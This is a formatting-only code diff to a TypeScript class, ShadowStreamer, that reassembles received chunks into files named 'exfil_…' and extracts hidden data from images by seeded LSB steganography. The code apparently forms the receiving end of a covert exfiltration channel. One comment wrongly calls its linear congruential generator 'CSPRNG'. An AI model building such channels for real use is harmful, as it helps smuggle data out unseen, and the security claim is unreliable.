@@ -15,9 +15,16 @@ export class ShadowStreamer {
   /**
    * Receive and store a chunk of data
    */
-  static async receiveChunk(transferId: number, chunkIndex: number, data: Buffer) {
+  static async receiveChunk(
+    transferId: number,
+    chunkIndex: number,
+    data: Buffer,
+  ) {
     await this.init();
-    const chunkPath = path.join(this.CHUNK_DIR, `${transferId}_${chunkIndex}.chunk`);
+    const chunkPath = path.join(
+      this.CHUNK_DIR,
+      `${transferId}_${chunkIndex}.chunk`,
+    );
     await fs.writeFile(chunkPath, data);
     return true;
   }
@@ -25,7 +32,11 @@ export class ShadowStreamer {
   /**
    * Reassemble all chunks into a final file in the vault
    */
-  static async reassemble(transferId: number, totalChunks: number, fileName: string) {
+  static async reassemble(
+    transferId: number,
+    totalChunks: number,
+    fileName: string,
+  ) {
     const buffers: Buffer[] = [];
     for (let i = 0; i < totalChunks; i++) {
       const chunkPath = path.join(this.CHUNK_DIR, `${transferId}_${i}.chunk`);
@@ -40,7 +51,10 @@ export class ShadowStreamer {
     }
 
     const finalBuffer = Buffer.concat(buffers);
-    const result = await storagePut(`exfil_${transferId}_${fileName}`, finalBuffer);
+    const result = await storagePut(
+      `exfil_${transferId}_${fileName}`,
+      finalBuffer,
+    );
     return result;
   }
 
@@ -48,7 +62,10 @@ export class ShadowStreamer {
    * Cryptographically Scattered LSB Extraction
    * Uses a CSPRNG-seeded random walk to recover bits scattered across the image.
    */
-  static async extractFromImage(imageBuffer: Buffer, seed: string): Promise<Buffer> {
+  static async extractFromImage(
+    imageBuffer: Buffer,
+    seed: string,
+  ): Promise<Buffer> {
     const Jimp = require("jimp");
     const image = await Jimp.read(imageBuffer);
     const { width, height } = image.bitmap;
@@ -56,11 +73,11 @@ export class ShadowStreamer {
     const totalChannels = totalPixels * 3; // RGB only
 
     // Create a seeded PRNG for the random walk
-    const hash = crypto.createHash('sha256').update(seed).digest();
+    const hash = crypto.createHash("sha256").update(seed).digest();
     let state = hash.readUInt32BE(0);
     const prng = () => {
       state = (state * 1664525 + 1013904223) >>> 0;
-      return state / 0xFFFFFFFF;
+      return state / 0xffffffff;
     };
 
     // Generate the scattered indices
@@ -81,7 +98,7 @@ export class ShadowStreamer {
       const pixelIdx = Math.floor(channelIdx / 3);
       const colorChannel = channelIdx % 3;
       const byteIdx = pixelIdx << 2;
-      
+
       const pixelValue = image.bitmap.data[byteIdx + colorChannel];
       bits += (pixelValue & 1).toString();
 
